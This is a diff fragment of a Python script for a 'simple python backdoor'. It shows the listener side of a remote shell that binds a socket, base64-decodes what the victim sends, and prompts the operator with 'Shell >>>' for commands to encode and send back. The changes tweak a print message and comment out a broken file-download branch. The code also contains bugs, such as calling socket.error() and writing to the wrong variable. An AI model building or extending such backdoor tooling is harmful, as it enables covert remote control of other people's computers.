@@ -46,16 +46,18 @@ def simple_python_backdoor_create_socket():
 def simple_python_backdoor_socket_bind(sock):
 
     try:
-        print(f'Server started and listening on {PORT}...')
+        print(f'Server started and listening on Port: +{PORT}...')
         sock.bind(('', PORT))
         sock.listen(5)
     except socket.error() as str_error:
         print(f'Error binding socket {str_error}.\nRetrying...')
 
+
 def simple_python_backdoor_recv_file(data, file):
 
     with open(file, 'wb') as _file:
         file.write(data)
+
 
 def main():
 
@@ -74,12 +76,13 @@ def main():
         data = connection.recv(CHUNKS)
         str_data = _base64_decode(data)
 
-        #TODO: Function copy not workin.
-        if str_data == 'Attempting download...':
-            pass
-            # simple_python_backdoor_recv_file(str_data, 'recvice_file')
-        else:
-            print(str_data)
+        # TODO: Function copy not workin.
+        # if str_data == 'Attempting download...':
+        #     pass
+        #     # simple_python_backdoor_recv_file(str_data, 'recvice_file')
+        # else:
+
+        print(str_data)
 
         command = input('Shell >>> ').lower()
         output = _base64_encode(command)
